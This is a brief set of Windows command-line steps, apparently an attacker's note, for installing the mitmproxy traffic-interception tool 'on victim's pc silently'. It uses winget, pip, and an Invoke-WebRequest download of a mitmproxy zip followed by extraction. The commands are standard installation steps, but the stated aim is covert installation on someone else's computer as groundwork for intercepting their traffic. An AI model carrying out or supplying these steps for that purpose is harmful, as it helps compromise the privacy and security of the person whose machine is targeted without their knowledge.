Run the command below to install mitmproxy installer on victim's pc silently


First, install python:
	winget install Python.Python.3

Then, install mitmproxy:
	python -m pip install mitmproxy

Finally, verify installation:
	mitmproxy --version


ALTERNATIVE, RUN IF THE FIRST WAY DID NOT WORK:
Invoke-WebRequest -Uri "https://downloads.mitmproxy.org/11.1.0/mitmproxy-11.1.0-windows-x86_64.zip" -OutFile "C:\path\to\save\mitmproxy-installer.zip"

Then extract it (.zip file has .exe of 3 mitmproxy services)
Expand-Archive -Path "C:\Users\<YourUsername>\Downloads\file.zip" -DestinationPath "C:\Users\<YourUsername>\Downloads\extracted" -Force
